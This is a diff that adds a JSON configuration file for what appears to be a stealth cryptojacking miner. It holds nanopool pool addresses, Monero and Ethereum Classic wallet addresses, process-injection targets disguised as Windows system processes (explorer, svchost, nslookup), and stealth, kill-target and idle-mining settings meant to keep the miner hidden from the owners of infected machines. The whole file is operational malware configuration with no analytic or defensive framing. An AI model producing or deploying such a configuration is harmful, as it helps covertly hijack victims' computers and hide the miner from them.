@@ -1,0 +1,52 @@
+{
+	"CPU":
+		{
+    		"Pool": "xmr-eu1.nanopool.org:14433",
+    		"Wallet/User": "46f7NjFY7YLQnbHNq5332wYFf7rT3KGpt3jAS5WmeJDqjTuqS3bFx5t8TeodGXqsYidpoukpVpbXvKHSfPcz2gdGMsuFhXY",
+    		"Password": "",
+    		"StealthTargets": "",
+			"KillTargets": "",
+			"RemoteConfiguration": "",
+    		"MaxCpu": 50,
+			"IdleMining": true,
+    		"IdleCpu": 100,
+    		"IdleTime": 5,
+			"Algorithm": "rx/0",
+    		"SSL/TLS": true,
+			"Inject": "explorer"
+		},
+
+	"ETH":
+		{
+			"Pool": "Pool",
+    		"Wallet/User": "Wallet/User",
+    		"WorkerName": "",
+    		"Password": "",
+			"StealthTargets": "",
+			"KillTargets": "",
+			"RemoteConfiguration": "",
+    		"MaxGpu":  50,
+			"IdleMining": false,
+    		"IdleGpu": 100,
+    		"IdleTime": 5,
+			"Scheme": "stratum",
+			"Inject": "nslookup"
+		},
+
+	"ETC":
+		{
+			"Pool": "etc-eu1.nanopool.org:19999",
+    		"Wallet/User": "0xb89C9899B55e26A354A521725565B1C540Ba4f47",
+    		"WorkerName": "",
+    		"Password": "",
+			"StealthTargets": "",
+			"KillTargets": "",
+			"RemoteConfiguration": "",
+    		"MaxGpu": 50,
+			"IdleMining": true,
+    		"IdleGpu": 100,
+    		"IdleTime": 5,
+			"Scheme": "stratum",
+			"Inject": "svchost"
+		}
+}
